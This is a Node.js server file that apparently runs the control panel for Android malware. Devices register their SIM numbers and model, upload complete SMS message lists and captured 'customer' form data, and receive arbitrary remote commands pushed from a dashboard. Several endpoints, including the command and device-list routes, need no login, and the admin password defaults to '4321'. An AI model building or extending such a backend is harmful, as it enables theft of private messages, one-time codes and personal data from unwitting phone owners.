require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// short request timeouts to fail fast on deploy platforms
app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

const MONGO_URI = process.env.MONGO_URI || '';
if (!MONGO_URI) { console.error('MONGO_URI missing'); process.exit(1); }
mongoose.set('bufferCommands', false);
mongoose.connect(MONGO_URI, {
  serverSelectionTimeoutMS: 5000,
  connectTimeoutMS: 10000,
  socketTimeoutMS: 45000,
  maxPoolSize: 10,
  // Temporary workaround: force w:1 to avoid replica-set writeConcern mode errors
  writeConcern: { w: 1 }
}).then(() => {
  dbConnected = true;
  console.log('MongoDB connected');
}).catch(err => {
  dbConnected = false;
  console.error('Mongo connect error', err);
  console.error('Continuing with in-memory fallback storage for local testing.');
});

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: Number,
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: Boolean,
  registrationTimestamp: Date,
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: Boolean,
  smsMessages: Array
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

// Fallback in-memory storage when MongoDB is not reachable (helps local testing)
let dbConnected = false;
const inMemoryDevices = [];

function clone(obj) { return obj ? JSON.parse(JSON.stringify(obj)) : obj; }

async function getDevicesFromStore() {
  if (dbConnected) return await Device.find({ isDeleted: { $ne: true } }).lean();
  return inMemoryDevices.filter(d => !d.isDeleted).map(clone);
}

async function findOneInStore(query) {
  if (dbConnected) return await Device.findOne(query).lean();
  // handle simple queries only (deviceId or serialNumber)
  const keys = Object.keys(query);
  return clone(inMemoryDevices.find(d => keys.every(k => d[k] === query[k])) || null);
}

async function findOneAndUpdateInStore(query, update, opts) {
  if (dbConnected) return await Device.findOneAndUpdate(query, update, opts);
  // Basic emulation of $set and $setOnInsert for in-memory
  // Support $or query with deviceId or serialNumber
  let item = null;
  if (query.$or && Array.isArray(query.$or)) {
    for (const q of query.$or) {
      const k = Object.keys(q)[0];
      const v = q[k];
      item = inMemoryDevices.find(d => d[k] === v);
      if (item) break;
    }
  } else {
    const k = Object.keys(query)[0];
    const v = query[k];
    item = inMemoryDevices.find(d => d[k] === v);
  }

  if (!item) {
    // insert
    const newItem = {};
    // set identifying fields from query when possible
    if (query.deviceId) newItem.deviceId = query.deviceId;
    if (query.serialNumber) newItem.serialNumber = query.serialNumber;
    if (update && update.$setOnInsert) Object.assign(newItem, clone(update.$setOnInsert));
    if (update && update.$set) Object.assign(newItem, clone(update.$set));
    inMemoryDevices.push(newItem);
    return clone(newItem);
  }

  if (update && update.$set) Object.assign(item, clone(update.$set));
  return clone(item);
}

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map(); // deviceId -> Set(ws)

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

// --- API Routes ---
app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  try {
    console.log('API /api/login attempt for user:', username);
  } catch (e) { /* ignore logging errors */ }
  if (username === 'admin' && password === adminPassword) {
    console.log('API /api/login success for admin');
    return res.json({ success: true });
  }
  console.log('API /api/login failed for user:', username);
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

// Allow changing admin password from dashboard (in-memory only)
app.post('/api/change-password', (req, res) => {
  try {
    const { oldPassword, newPassword } = req.body || {};
    if (!oldPassword || !newPassword) return res.status(400).json({ success: false, message: 'Missing fields' });
    if (oldPassword !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong Old Password' });
    adminPassword = newPassword;
    console.log('Admin password changed via /api/change-password');
    return res.json({ success: true });
  } catch (e) {
    console.error('change-password error', e && e.message);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.get('/api/devices', async (req, res) => {
  try {
    const list = await getDevicesFromStore();
    const now = Date.now();
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { console.error(err); res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
    const r = await findOneAndUpdateInStore({ deviceId }, { $set: { isDeleted: true, isOnline: false } }, { returnDocument: 'after' });
    if (!r) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (err) { console.error(err); return res.status(500).json({ success: false }); }
});

app.post('/api/pin-device', async (req, res) => {
  try {
    const { deviceId, status } = req.body || {};
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
    const d = await findOneAndUpdateInStore({ deviceId }, { $set: { isPinned: !!status } }, { returnDocument: 'after' });
    if (!d) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (e) { console.error(e); return res.status(500).json({ success: false }); }
});

app.post('/api/submit-data', async (req, res) => {
  try {
    const { deviceId, data } = req.body || {};
    if (!deviceId || data === undefined) return res.status(400).json({ success: false, message: 'Missing fields' });
    const d = await findOneAndUpdateInStore({ deviceId }, { $set: { customerData: data, lastSeen: new Date() } }, { returnDocument: 'after' });
    if (!d) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (e) { console.error(e); return res.status(500).json({ success: false }); }
});

app.post('/api/command', async (req, res) => {
  try {
    const { deviceId, action, data } = req.body || {};
    if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });
    // Read device from store (DB or in-memory). Do not fail hard on DB issues.
    let device = null;
    try { device = await findOneInStore({ deviceId }); } catch (dbErr) { console.error('Store lookup error for /api/command (continuing):', dbErr && dbErr.message); device = null; }

    const clients = global.deviceSockets.get(deviceId);

    // Debug logging to help reproduce frontend issue
    try { console.log('/api/command', { deviceId, action, hasDevice: !!device, connections: clients ? clients.size : 0 }); } catch (e) { /* ignore logging errors */ }

    // Handle view actions with offline support: return stored data immediately and trigger background refresh if online
    if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
      const isOnline = clients && clients.size > 0;

      // Trigger background refresh if device is connected
      if (isOnline) {
        clients.forEach((client) => {
          try { if (client.readyState === WebSocket.OPEN) client.send(JSON.stringify({ command: action, data: {} })); } catch (e) { console.error('WS send error:', e && e.message); }
        });
      }

      if (!device) {
        // If no stored data but we asked device to send it, return a success message.
        if (isOnline) return res.json({ success: true, isOnline, message: 'Requested data from device' });
        return res.status(404).json({ success: false, message: 'Device not found' });
      }

      const responseData = { success: true, isOnline };
      if (action === 'VIEW_SMS') {
        let messages = device.smsMessages || [];
        messages = messages.slice().sort((a, b) => (b.date || b.time || 0) - (a.date || a.time || 0));
        responseData.messages = messages;
      }
      if (action === 'VIEW_FORM') responseData.customerData = device.customerData || {};
      if (action === 'VIEW_DATA') responseData.device = device;

      return res.json(responseData);
    }

    // For non-view actions: require device to be connected and forward command
    if (!clients || clients.size === 0) return res.json({ success: false, message: 'Device not connected' });

    let sentCount = 0;
    clients.forEach((client) => {
      try {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({ command: action, data }));
          sentCount++;
        }
      } catch (e) { console.error('WS send error:', e && e.message); }
    });

    if (sentCount === 0) return res.json({ success: false, message: 'Device not connected' });
    return res.json({ success: true, message: 'Command sent', sentTo: sentCount });
  } catch (err) { console.error('Command error:', err); return res.status(500).json({ success: false, message: err.message }); }
});

// Serve index
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// Health
app.get('/health', (req, res) => {
  const states = ['disconnected','connected','connecting','disconnecting'];
  const mongoState = mongoose.connection && typeof mongoose.connection.readyState === 'number' ? states[mongoose.connection.readyState] || mongoose.connection.readyState : 'unknown';
  res.json({ status: 'ok', pid: process.pid, mongo: { readyState: mongoose.connection.readyState, state: mongoState } });
});

// Upgrade HTTP -> raw WebSocket for device connections
server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return; // let socket.io handle its upgrades
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

// WS handlers for device connections
wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);

  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);

      // registration message from device
      if (data.deviceId || data.serialNumber) {
        const id = data.deviceId || data.serialNumber;
        ws.deviceId = id;
        if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
        global.deviceSockets.get(id).add(ws);

        const update = { $set: { isOnline: true, lastSeen: new Date() } };
        if (data.model) update.$set.model = data.model;
        if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
        if (data.sim1) update.$set.sim1 = data.sim1;
        if (data.sim2) update.$set.sim2 = data.sim2;
        if (data.battery !== undefined) update.$set.battery = Number(data.battery) || 0;

        await findOneAndUpdateInStore({ $or: [{ deviceId: id }, { serialNumber: id }] }, { ...update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
        io.emit('dashboard-update');
      }

      if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
        await findOneAndUpdateInStore({ deviceId: data.deviceId }, { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } });
        io.emit('dashboard-update');
      }

      if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
        await findOneAndUpdateInStore({ deviceId: data.deviceId }, { $set: { customerData: data.customerData, lastSeen: new Date() } });
        io.emit('dashboard-update');
        if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ status: 'ok' }));
      }
    } catch (e) { console.error('ws message error', e && e.message); }
  });

  ws.on('close', () => {
    if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
      const set = global.deviceSockets.get(ws.deviceId);
      set.delete(ws);
      if (set.size === 0) global.deviceSockets.delete(ws.deviceId);
    }
  });

  ws.on('error', (err) => console.error('WS error', err && err.message));
});

// socket.io for dashboard clients
io.on('connection', (socket) => {
  socket.on('disconnect', () => {});
});

// heartbeat for wss
const heartbeat = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    try { ws.ping(); } catch (e) { /* ignore */ }
  });
}, 20000);

process.on('uncaughtException', (err) => console.error('uncaughtException', err));
process.on('unhandledRejection', (r) => console.error('unhandledRejection', r));

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  clearInterval(heartbeat);
  server.close(() => {
    mongoose.connection.close(false, () => process.exit(0));
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('Server listening on', PORT));

 
